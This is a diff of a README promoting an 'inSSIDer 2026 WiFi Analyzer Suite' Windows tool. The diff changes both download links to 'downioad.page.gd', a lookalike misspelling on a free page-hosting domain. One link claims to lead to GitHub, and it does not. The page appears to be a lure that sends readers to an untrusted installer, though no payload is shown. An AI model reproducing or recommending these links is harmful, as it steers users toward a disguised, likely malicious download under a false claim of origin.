@@ -2,7 +2,7 @@
 
 inSSIDer 2026 WiFi Analyzer Suite is an advanced Windows desktop tool designed for comprehensive WiFi network analysis, building upon the core inSSIDer functionality with enhanced features for security and performance optimization. It provides users with a robust set of utilities to monitor, diagnose, and improve wireless networks in home, office, or enterprise environments.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Why Choose inSSIDer 2026?
 
@@ -68,6 +68,6 @@ Absolutely. inSSIDer 2026 WiFi Analyzer Suite is free for both personal and comm
 
 For the latest version, updates, and additional resources, please visit the official download page:
 
-[Get the latest version from GitHub](https://download-page.page.gd/)
+[Get the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026
